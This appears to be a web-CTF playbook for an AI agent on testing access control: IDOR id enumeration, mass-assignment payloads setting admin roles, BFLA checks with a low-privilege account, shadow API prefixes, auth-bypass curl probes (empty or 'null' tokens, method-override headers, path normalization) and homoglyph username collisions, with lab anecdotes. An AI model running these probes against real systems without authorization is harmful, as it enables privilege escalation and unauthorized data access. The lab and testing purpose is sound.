# Access control — IDOR, mass assignment, auth bypass, shadow APIs

## A. IDOR / BOLA — numeric ids or UUIDs

```bash
for id in 0 1 2 3 100 999 9999; do
  echo "=== id=$id ==="; curl -si "<target>/api/<endpoint>/$id" $AUTH_HEADER
done

curl -si "<target>/api/<endpoint>/00000000-0000-0000-0000-000000000000" $AUTH_HEADER
curl -si "<target>/api/<endpoint>/$((YOUR_ID - 1))" $AUTH_HEADER
curl -si "<target>/api/<endpoint>/$((YOUR_ID + 1))" $AUTH_HEADER
```

**Check what the id space actually is before concluding.** If `/api/resource/4` says "not found" for your *own* id, the route is probably keyed by something else — username, slug, share token. Test with your own known identifier of each type before declaring no IDOR.

### Recheck reads after a visibility or access change

When an action should revoke access (archive, unpublish, make private, remove a member, or revoke a share), test the reads **after** the action on a disposable owned object, before restoring it. A successful write or disappearance from a listing does not prove that direct reads were revoked. Reuse the known object ID and share code across detail, list, share, raw/download/export, and collection views. Compare the owner, an unrelated same-role user, and anonymous access. Keep a separate never-public private object as a denying control; check response bodies and stored state, not status alone. If a non-owner still receives the object, replay the sequence with a fresh object to rule out stale or pre-change state.

Put a unique non-secret marker in the disposable object's content, then run the known read paths again after the state change. `probe.py --expect-absent` reports a post-state exposure only when a low-privilege or anonymous response still contains that marker; a list returning 200 without the object is not enough. Save before and after runs in separate output directories:

```bash
python3 ~/.codex/skills/web-ctf/scripts/probe.py --base <target> \
  --token "$OWNER_TOKEN" --lowpriv-token "$OTHER_TOKEN" \
  --paths known-object-reads.txt --expect-absent 'DISPOSABLE_MARKER' \
  --out recon/post-visibility
```

## B. Mass assignment — direct roles and nested capability maps

```bash
# profile update
curl -si -X PUT <target>/api/user/<your-id> $AUTH_HEADER \
  -H 'Content-Type: application/json' -d '{"role":"admin","isAdmin":true,"admin":true}'

# registration with elevated fields
curl -si -X POST <target>/api/register -H 'Content-Type: application/json' \
  -d '{"username":"attacker2","email":"a2@test.com","password":"Test1234!","role":"admin","isAdmin":true}'

# PATCH
curl -si -X PATCH <target>/api/user/<your-id> $AUTH_HEADER \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
```

After each attempt, **re-fetch your profile and re-probe the gated route**. A `200 updated`,
`200 registered`, or response echoing the submitted field proves only that the request was
accepted; serializers commonly accept and ignore unknown/protected fields. The privilege is
confirmed only when stored state changes or the previously denied capability opens. Prefer a
safe no-op action on the gated route when verification would otherwise mutate shared state.

Do not stop after the familiar scalar fields. A form or JSON endpoint can accept hidden nested
members even when the response schema and visible inputs do not advertise them. Harvest the full
authenticated form schema with `jsmine.py`; `FORM SCHEMAS` retains every input/select/textarea
name and bracket root. Visible names such as `meta[wm_bio]`, `options[email_notify]`, or a JSON
`meta` object are parser-shape evidence for hidden siblings, not proof that the siblings are safe.

Test one explicit child at a time at the exact observed nesting. For a WordPress-like clone, use
the bounded profile only after a capability-map signal exists:

```bash
python3 ~/.codex/skills/web-ctf/scripts/massassignquick.py \
  --url <target>/wp-admin/profile.php --method POST --encoding form \
  --baseline-file current/auth/profile-form.txt --path 'meta[wm_capabilities]' \
  --profile wordpress-capabilities --cleanup-value false \
  --readback '<target>/wp-json/wp/v2/users/me?context=edit' \
  --surface <target>/wp-admin/ \
  --oracle <target>/wp-admin/options-discussion.php \
  --cookie "$COOKIE" --out recon/massassignquick
```

The default `/me` representation may omit private meta. Prefer an edit/admin context when the
application supports one, and preserve the ordinary response as a control. Read the helper's
results in three levels:

- update response only: accepted request, not evidence;
- candidate appears in authoritative readback: **stored-only lead**;
- new menu/link/form or a denied route opens: **effective capability transition**.

An unchanged `role: subscriber` does not negate a stored capability map or a newly opened route.
Likewise, rejection of `role=administrator`, `capabilities=administrator`, or an
`administrator=true` child exhausts only those exact shapes. It says nothing about named
capabilities such as moderation, user-listing, settings, plugin, or theme actions. CVE parameter
lists are candidate sources for a clone, never an exact-match gate: a parameter need not be
rendered or documented to be accepted.

Treat every newly exposed page as a discovery fixpoint: harvest its full form again, submit only
one new setting with a valid baseline, and verify downstream state. For example, if a capability
opens a Discussion form containing `options[default_role]`, changing that setting is not yet
privilege escalation; register a fresh account and confirm its effective role. Continue until no
new links, forms, methods, or authorization transitions appear.

Cleanup is mandatory for multi-candidate runs. Use a verified neutral value such as `false`, or
use `--disposable` with exactly one candidate on an account/lab that can be discarded. A failed
cleanup, 429, gateway error, or invalid baseline is a circuit breaker, not a negative result.

## C. BFLA — the guard that was never mounted on one verb

Section G below defeats a guard that *exists*. This is the other case: a route where
nobody put one. Same path prefix, same app, one verb missing its middleware.

**You cannot see this with your own account.** Register a second, unprivileged user and
re-run every privileged route as that user:

```bash
LOW=$(curl -s -X POST <target>/api/register -H 'Content-Type: application/json' \
  -d '{"username":"lp1","email":"lp1@test.com","password":"Test1234!"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

for m in GET POST PUT PATCH DELETE; do
  echo "=== $m"; curl -si -X $m <target>/api/admin/<route> -H "Authorization: Bearer $LOW" | head -3
done
```

Or let the harness diff all three identities at once:

```bash
python3 ~/.codex/skills/web-ctf/scripts/probe.py --base <target> \
  --token "$ADMIN_TOKEN" --lowpriv-token "$LOW" --write --paths paths.txt
```

**The tell is inconsistency, not failure.** If three routes under `/api/admin/` answer
the low-priv account `403 Admin access required` and a fourth answers `200`, the app has
told you the group is meant to be guarded and named the one that isn't. Read a lone `200`
against the siblings, never on its own.

**Write verbs are where these live.** `GET` routes get the guard because they are the
ones a developer visits; the `DELETE` behind an admin-panel button is the one that gets
forgotten. `probe.py` skips `PUT`/`PATCH`/`DELETE` without `--write`, so the default run
is blind to exactly the verb that matters — pass `--write` on any `/admin/` prefix.

Route shape is a separate dimension from method. A mined `GET /api/objects/{...}` proves
the detail path exists but does not inventory its other handlers, while testing
`PATCH /api/objects` says nothing about `PATCH /api/objects/7`. On a disposable owned
object, add one actual method probe to every known route shape (repeat the option for a
larger matrix):

```bash
python3 ~/.codex/skills/web-ctf/scripts/probe.py --base <target> \
  --token "$LOW" --paths methods.txt --id 7 --expand-method PATCH --write
```

An empty JSON body is a route-discovery input, not a negative mass-assignment result.
Use the endpoint-specific validation/success response to identify the handler, then
replay a valid baseline with one server-owned property at a time and verify readback.

> **Being handed privileged credentials is a hint, not a shortcut.** When a lab gives you
> `admin:admin`, auth-vs-anonymous is the wrong axis: as admin the vulnerable call
> succeeds (correct behaviour), and anonymously it 401s. Neither is a finding. The creds
> exist to *show you which functions to re-run as a nobody*. On Ottergram every
> `/api/admin/*` route enforced the role except `DELETE /api/admin/posts/:id`, which
> checked only that a token existed — a self-registered account deleted any user's post
> and got the flag in the response body.

## Shadow / legacy API routes

The frontend calling only `/v2/*` does not mean older prefixes are gone. Try the same path under `/api/`, `/v1/`, `/internal/`, no prefix — the versioned route may enforce a role allowlist the legacy one skips (Sokudo: `PUT /v1/profile` filtered `role`, `PUT /api/profile` did not).

Distinguish a real shadow route from SPA fallback by **content-type + body**, never status: JSON payload = real; the identical N-byte `text/html` index = fallback.

## G. Auth bypass on 401/403 endpoints

```bash
curl -si <target>/api/admin/                                        # no token
curl -si <target>/api/admin/ -H "Authorization: Bearer "            # empty
curl -si <target>/api/admin/ -H "Authorization: Bearer null"
curl -si <target>/api/admin/ -H "Authorization: Bearer undefined"
curl -si <target>/api/admin/ -H "Authorization: Basic YWRtaW46YWRtaW4="

# method override
curl -si -X POST <target>/api/admin/ $AUTH_HEADER -H "X-HTTP-Method-Override: GET"
curl -si -X POST <target>/api/admin/ $AUTH_HEADER -H "_method: GET"

# path normalization
curl -si "<target>/api/admin/..%2fusers" $AUTH_HEADER
curl -si "<target>/api/./admin/users" $AUTH_HEADER
curl -si "<target>/API/admin/users" $AUTH_HEADER
```

## Username collision / normalization

Where a privileged check compares a **username string** (not a role column), test collisions:
- fullwidth homoglyphs (U+FF01–FF5E): `ａdmin` → NFKC `admin`
- case variants, leading/trailing whitespace, tab/newline, trailing dot or slash
- zero-width space, dotless `ı`, small-caps `ᴀ`

Quick check: `python3 -c "print('ａdmin'.encode())"` and confirm `.normalize('NFKC')` collapses before spending requests.

**Only pursue this when something indicates username-based authorization.** If `/api/verify-token` returns an explicit `role` field, the check is almost certainly a column lookup and collisions will not work — 16 variants on Tanuki all registered cleanly as separate users with `role: "user"`. Kill it fast and record it.
